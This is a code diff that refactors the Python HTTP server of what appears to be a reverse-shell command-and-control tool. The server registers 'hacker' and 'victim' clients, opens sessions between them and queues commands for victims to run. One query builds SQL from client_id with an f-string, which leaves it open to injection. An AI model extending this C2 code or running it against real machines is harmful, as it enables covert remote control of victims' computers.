@@ -10,26 +10,26 @@ from http import HTTPMethod, HTTPStatus
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Any, Callable
 
+import reverse_shell.server.server_helper as sh
 import reverse_shell.utils as ut
-from reverse_shell.server.server_helper import (
-    Config,
-    LiveSessionData,
-    get_argument_parser,
-)
 
 
 class ZrevshellServer(BaseHTTPRequestHandler):
     """Request handling."""
 
     def __init__(
-        self, config: Config, live_session_data: LiveSessionData, *args, **kwargs
+        self,
+        config: sh.Config,
+        sessions: sh.Sessions,
+        *args,
+        **kwargs,
     ):
         # Our configuration: tokens, ip, port and etc...
         self.config = config
         self.database = config.database
 
-        # Our data we use every time like the sessions
-        self.live_data = live_session_data
+        # Hacker and victim sessions
+        self.hacking_sessions = sessions
 
         # Defining the server_command-function relation using a dict
         self.server_command_functions: dict[
@@ -90,9 +90,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         """Get the client type of a specified client from the database. This could also be a means to check if the client
         has verified itself."""
         # query data from the database
-        cursor = self.database.session_data.cursor()
         usr_client_type = self.database.query(
-            cursor, f"SELECT client_type FROM clients WHERE client_id='{client_id}'"
+            f"SELECT client_type FROM clients WHERE client_id='{client_id}'"
         )
         # Let's return None if the client is not find in the database or an error occurred
         if usr_client_type is None or len(usr_client_type) == 0:
@@ -185,7 +184,6 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         """Do what needs to be done if the server command sent is 'verify'."""
         # First let's check if the user is already in the database
         result = self.database.query(
-            self.database.session_data.cursor(),
             "SELECT * FROM clients WHERE client_id=?",
             [client_id],
         )
@@ -194,25 +192,25 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # so we are going to inform that and stop the execution
         if result is not None:
             if len(result) > 0:
-                return (False, HTTPStatus.CONFLICT)
+                return sh.HandlerResponse(False, HTTPStatus.CONFLICT)
         # If our user is valid then we can maybe add him to the database
         client_insert_op = self.database.execute(
             "INSERT INTO clients VALUES(?, ?, 1)", [client_id, client_type]
         )
         if client_insert_op is None:
             # Some kinda SQL error happened so let's send a internal server error message
-            return (False, HTTPStatus.INTERNAL_SERVER_ERROR)
+            return sh.HandlerResponse(False, HTTPStatus.INTERNAL_SERVER_ERROR)
 
         # If the client is a victim then we will require more data from the body and
         # add it to the victim_info database.
         if client_type.__str__() == ut.ClientType.Victim.__str__():
             # Let us insert the victim_info in the database after checking if the req_body isn't None
             if req_body is None:
-                return (False, HTTPStatus.BAD_REQUEST)
+                return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
             self.insert_victim_info_db(client_id, req_body)
 
         # If all is good return OK
-        return (True, HTTPStatus.OK)
+        return sh.HandlerResponse(True, HTTPStatus.OK)
 
     def handle_cmd_post_res(
         self, client_id: str, client_type: int, req_body: str | None
@@ -223,16 +221,17 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def handle_cmd_post_cmd(
         self, client_id: str, client_type: int, req_body: str | None
     ):
+        self.headers
         """Do what needs to be done if the server command is 'post_cmd'"""
         # First lets assign an ID to the command we are inserting to the db
         command_id = ut.generate_token()
 
         # Bad request return message
-        bad_request = (False, HTTPStatus.BAD_REQUEST)
+        bad_request = sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Check if our req_body isn't None
         if req_body is None:
-            return (False, HTTPStatus.BAD_REQUEST)
+            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         try:
             # Let's try to decode this fella
@@ -242,46 +241,36 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             # so let's return the bad_request as an indicator
             return bad_request
 
-        victim_id = data.get("victim_id", None)
+        session_id = data.get("session_id", None)
         command = data.get("command", None)
 
-        if victim_id is None or command is None:
+        if session_id is None or command is None:
             return bad_request
 
-        # Now let's check if the victim exists in the database and the user is actually a victim
-        # because if the victim doesn't exist, there is no point in adding the data in the db.
-        # We can use the self.get_client_type method for that
-        if (
-            self.get_client_type_from_db(victim_id) is None
-            or self.get_client_type_from_db(victim_id) != ut.ClientType.Victim
-        ):
-            return (False, HTTPStatus.EXPECTATION_FAILED)
-
-        # Now let's check if the user is already in a session, but not with us
-        # if that's the case, we can't write the command in the db, or even if the
-        # user is not in a session at all, the hacker first should establish a session
-        # with the victim then, insert the command in.
-
-        if (
-            self.live_data.hacking_sessions.get(victim_id, None) is None
-            or self.live_data.hacking_sessions.get(victim_id, None) != client_id
-        ):
+        # Check if the session is not still active
+        if not self.hacking_sessions.check_session_active(session_id):
             # The victim is not even in session or it is in one, but
             # not with this hacker. So let's return an error
-            return (False, HTTPStatus.FORBIDDEN)
+            return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
+
+        # Check if the hacker himself is not in the session
+        if not self.hacking_sessions.check_client_in_session(client_id):
+            # The hacker is not accessing his own session_id so let's return
+            # an error code
+            return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
 
         # If we are in session with the victim and satisfy all the other requirements
         # we can proceed by inserting the command in the database.
         result = self.database.execute(
             "INSERT INTO commands VALUES(?, ?, ?, ?)",
-            [command_id, victim_id, command, datetime.date.today().isoformat()],
+            [command_id, session_id, command, datetime.date.today().isoformat()],
         )
 
         if result is None:
             return (False, HTTPStatus.INTERNAL_SERVER_ERROR)
 
         # If all went good, lets once again return the OK response
-        return (True, HTTPStatus.CREATED)
+        return sh.HandlerResponse(True, HTTPStatus.CREATED)
 
     def handle_cmd_create_session(
         self, client_id: str, client_type: int, req_body: str | None
@@ -293,7 +282,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # if no req_body we can't do anything so let's report error
         if victim_id is None:
-            return (False, HTTPStatus.BAD_REQUEST)
+            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Let's check if the victim is valid by using the self.get_client_type function
         valid_victim = (
@@ -302,19 +291,19 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # If the victim is invalid, send a bad request for the user
         if not valid_victim:
-            return (False, HTTPStatus.BAD_REQUEST)
+            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
-        if self.live_data.hacking_sessions.get(victim_id, None) is not None:
+        if self.hacking_sessions.check_client_in_session(victim_id):
             # This means the victim is already in session with another hacker
             # so let's notify the hacker about it by sending a forbidden error
-            return (False, HTTPStatus.FORBIDDEN)
+            return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
 
         # If the victim is valid and not already in session with somebody else
         # let's put him in a session with the hacker.
-        self.live_data.hacking_sessions[victim_id] = client_id
+        session_id = self.hacking_sessions.add_session(client_id, victim_id)
 
         # Finally report the OK message
-        return (True, HTTPStatus.OK)
+        return sh.HandlerResponse(True, HTTPStatus.OK, session_id.encode("utf8"))
 
     def execute_command(
         self,
@@ -322,7 +311,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         command: str,
         handler_func,
         *args,
-        client_type_from_headers: bool = False,
+        get_client_type_from_headers: bool = False,
         **kwargs,
     ):
         """This method is in charge of handling any server command, provided the handler_function which handles the work done for the server command.
@@ -330,7 +319,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         """
         legit_client = False
 
-        if client_type_from_headers:
+        if get_client_type_from_headers:
             # First get the client_type of the user and check
             # if the user claims match his tokens.
 
@@ -377,19 +366,22 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Having the post request ready and having a legit client let's execute
         # the handler for the command.
-        result = handler_func(
+        result: sh.HandlerResponse = handler_func(
             *args, client_id=client_id, client_type=client_type, req_body=body, **kwargs
         )
 
         # Now we will send what the result sends, the result is expected to be
-        # a tuple in a format of (result: bool, status_code: HTTPStatus) and we'll use that
-        # for determining wether the result is an error or not and get the status code.
-        # using our result let's now say something to the client.
-        if result[0] is True:
-            self.send_response(result[1])
+        # HandlerResponse which is easier to maintain.
+        if result.successful is True:
+            self.send_response(result.res_code)
             self.end_headers()
         else:
-            self.c_send_error(result[1])
+            self.c_send_error(result.res_code)
+
+        # let's add the body if provided in the
+        # response by the handler_func
+        if result.body is not None:
+            self.wfile.write(result.body)
 
     # ---------- HTTP request method handler methods ---------- #
 
@@ -450,7 +442,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             client_id,
             command,
             handler,
-            client_type_from_headers=(True if command == "verify" else False),
+            get_client_type_from_headers=(True if command == "verify" else False),
         )
 
     def do_GET(self):
@@ -463,8 +455,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
 
 def run_server(
-    configuration: Config,
-    live_session_data: LiveSessionData,
+    configuration: sh.Config,
+    sessions: sh.Sessions,
     httpd: HTTPServer | None = None,
 ):
     """Start the HTTP server"""
@@ -475,7 +467,7 @@ def run_server(
     # We are using partials because only can pass the class to
     # HTTPServer not an object so we can use functools.partial to solve
     # the issue.
-    zrevshell_server = partial(ZrevshellServer, configuration, live_session_data)
+    zrevshell_server = partial(ZrevshellServer, configuration, sessions)
 
     # Initiate the server
     ut.log("debug", f"Server is starting on ({ip}:{port})...")
@@ -539,14 +531,14 @@ def run_server(
 def main():
     """Run the reverse shell server"""
     # Initializing our configuration
-    parser = get_argument_parser()
-    configuration = Config(parser.parse_args())
+    parser = sh.get_argument_parser()
+    configuration = sh.Config(parser.parse_args())
 
-    # Creating our live data
-    live_data = LiveSessionData()
+    # Creating our sessions
+    sessions = sh.Sessions()
 
     # Let's rockin roll
-    run_server(configuration, live_data)
+    run_server(configuration, sessions)
 
 
 if __name__ == "__main__":
